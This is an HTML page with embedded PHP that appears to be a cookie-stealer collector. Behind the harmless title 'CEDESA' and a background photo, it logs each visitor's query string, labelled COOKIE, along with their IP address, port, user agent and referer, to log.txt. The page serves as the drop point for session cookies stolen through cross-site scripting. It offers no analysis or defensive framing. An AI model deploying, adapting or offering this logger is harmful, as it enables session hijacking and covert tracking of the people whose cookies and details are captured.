<!DOCTYPE html>
<html>
<head>
    <title>CEDESA</title>
    <style>
        body {
            background-image: url(https://upload.wikimedia.org/wikipedia/commons/1/15/Ingresso_Miniera_Cerro_Rico.jpg);
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: cover;
        }
    </style>
</head>
<body>

<?php

function GetIP()
{
    if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) {
        $ip = getenv("HTTP_CLIENT_IP");
    } else {
        if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) {
            $ip = getenv("HTTP_X_FORWARDED_FOR");
        } else {
            if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) {
                $ip = getenv("REMOTE_ADDR");
            } else {
                if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'],
                        "unknown")) {
                    $ip = $_SERVER['REMOTE_ADDR'];
                } else {
                    $ip = "unknown";
                }
            }
        }
    }

    return ( $ip );
}

function logData()
{
    $ipLog            = "log.txt";
    $cookie           = $_SERVER['QUERY_STRING'];
    $register_globals = (bool) ini_get('register_gobals');
    if ($register_globals) {
        $ip = getenv('REMOTE_ADDR');
    } else {
        $ip = GetIP();
    }

    $rem_port    = is_null($_SERVER['REMOTE_PORT']) ? '' : $_SERVER['REMOTE_PORT'];
    $user_agent  = is_null($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'];
    $rqst_method = is_null($_SERVER['METHOD']) ? '' : $_SERVER['METHOD'];
    $rem_host    = is_null($_SERVER['REMOTE_HOST']) ? '' : $_SERVER['REMOTE_HOST'];
    $referer     = is_null($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'];
    $date        = date("l dS of F Y h:i:s A");
    $log         = fopen("$ipLog", "a+");

    if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog)) {
        fputs($log,
            "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE{ : } $date | COOKIE:  $cookie <br>");
    } else {
        fputs($log,
            "IP: $ip | PORT: $rem_port | HOST: $rem_host |  Agent: $user_agent | METHOD: $rqst_method | REF: $referer |  DATE: $date | COOKIE:  $cookie \n\n");
    }
    fclose($log);
}

logData();

?>


</body>
</html>